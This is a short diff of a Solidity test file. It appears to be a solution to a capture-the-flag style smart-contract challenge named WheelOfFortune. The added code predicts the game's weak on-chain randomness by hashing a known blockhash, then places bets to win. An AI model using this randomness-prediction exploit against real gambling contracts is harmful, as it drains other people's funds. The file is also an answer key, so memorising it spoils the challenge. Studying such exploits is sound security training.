@@ -15,9 +15,15 @@ contract WheelOfFortuneTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint256 firstBet = rand(blockhash(48743985), 100);
+        instance.spin{value: 0.01 ether}(firstBet);
+        instance.spin{value: 0.01 ether}(0);
 
         checkSuccess();
+    }
+
+    function rand(bytes32 _hash, uint256 _max) internal pure returns (uint256 result) {
+        result = uint256(keccak256(abi.encode(_hash))) % _max;
     }
 
     function checkSuccess() internal view override {
